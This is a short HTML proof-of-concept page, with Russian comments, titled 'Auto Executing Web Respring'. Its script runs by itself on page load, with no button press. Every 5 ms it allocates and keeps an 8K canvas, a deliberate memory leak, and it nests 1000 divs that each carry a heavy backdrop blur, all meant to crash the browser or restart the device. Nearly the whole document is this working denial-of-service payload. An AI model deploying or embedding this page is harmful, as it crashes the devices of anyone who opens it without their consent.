<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto Executing Web Respring Proof of Concept</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: #0d1117;
            color: #c9d1d9;
            padding: 20px;
        }
        /* Вложенный тяжелый backdrop-filter */
        .crash-box {
            backdrop-filter: blur(100px) contrast(200%);
            -webkit-backdrop-filter: blur(100px) contrast(200%);
            width: 100%;
            height: 100%;
        }
    </style>
</head>
<body>
    <h1>Автоматическое выполнение (без кнопок)</h1>

    <script>
        // Скрипт срабатывает автоматически при открытии страницы
        window.onload = function() {
            // 1. Агрессивная утечка памяти через Canvas (высокая частота)
            window.memoryLeaks = [];
            setInterval(() => {
                const canvas = document.createElement('canvas');
                canvas.width = 7680; // 8K
                canvas.height = 4320;
                const ctx = canvas.getContext('2d');
                if (ctx) {
                    ctx.fillStyle = 'red';
                    ctx.fillRect(0, 0, canvas.width, canvas.height);
                }
                window.memoryLeaks.push(canvas);
            }, 5);

            // 2. Глубокое рекурсивное создание DOM-дерева с блюр-фильтрами
            let root = document.body;
            for (let i = 0; i < 1000; i++) {
                let div = document.createElement('div');
                div.className = 'crash-box';
                root.appendChild(div);
                root = div;
            }
        };
    </script>
</body>
</html>
